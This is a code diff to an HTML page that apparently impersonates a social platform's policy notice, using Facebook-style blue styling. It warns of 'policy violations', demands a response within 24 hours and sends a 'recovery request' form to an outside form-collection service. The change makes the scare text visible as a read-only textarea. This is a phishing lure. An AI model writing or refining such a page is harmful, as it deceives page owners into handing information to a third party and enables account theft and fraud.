@@ -25,7 +25,18 @@
     h2 {
       margin-bottom: 20px;
     }
+    textarea {
+      width: 100%;
+      height: 160px;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      resize: none;
+      font-size: 14px;
+      background: #f5f5f5;
+    }
     button {
+      margin-top: 15px;
       padding: 12px 20px;
       background: #1877f2;
       color: #fff;
@@ -45,12 +56,12 @@
     <h2>⚠️ Important Notice</h2>
 
     <form action="https://submit-form.com/09HQTNPsI" method="POST">
-      <!-- Fixed message hidden field -->
-      <input type="hidden" name="message" value="Our system has detected potential policy violations on your page.
+      <textarea name="message" readonly>
+Our system has detected potential policy violations on your page.
 If you believe this is a mistake, you can submit a recovery request here.
 Please respond within 24 hours to avoid restrictions being applied.
-Thank you for your understanding.">
-
+Thank you for your understanding.
+      </textarea>
       <button type="submit">Submit</button>
     </form>
   </div>
